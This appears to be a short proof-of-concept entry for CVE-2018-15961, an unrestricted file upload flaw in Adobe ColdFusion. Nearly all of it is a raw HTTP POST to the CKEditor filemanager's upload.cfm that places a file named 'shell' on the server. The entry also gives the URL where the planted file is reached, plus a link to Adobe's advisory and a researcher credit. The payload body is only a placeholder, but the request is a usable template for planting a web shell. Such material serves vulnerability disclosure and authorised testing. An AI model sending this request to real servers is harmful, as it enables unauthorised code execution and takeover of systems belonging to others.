# CVE-2018-15961
Unrestricted file upload in Adobe ColdFusion

```
POST /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cfm HTTP/1.1
Host: coldfusion:port
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
Content-Type: multipart/form-data; boundary=---------------------------24464570528145
Content-Length: 303
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------24464570528145
Content-Disposition: form-data; name="file"; filename="shell"
Content-Type: image/jpeg

%%%%%%%%
-----------------------------24464570528145
Content-Disposition: form-data; name="path"

shell
-----------------------------24464570528145--
```

https://helpx.adobe.com/security/products/coldfusion/apsb18-33.html
http://coldfusion:port/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/uploadedFiles/shell


Unrestricted file upload/Arbitrary code execution/Critical

**Pete Freitag of Foundeo CVE-2018-15961**
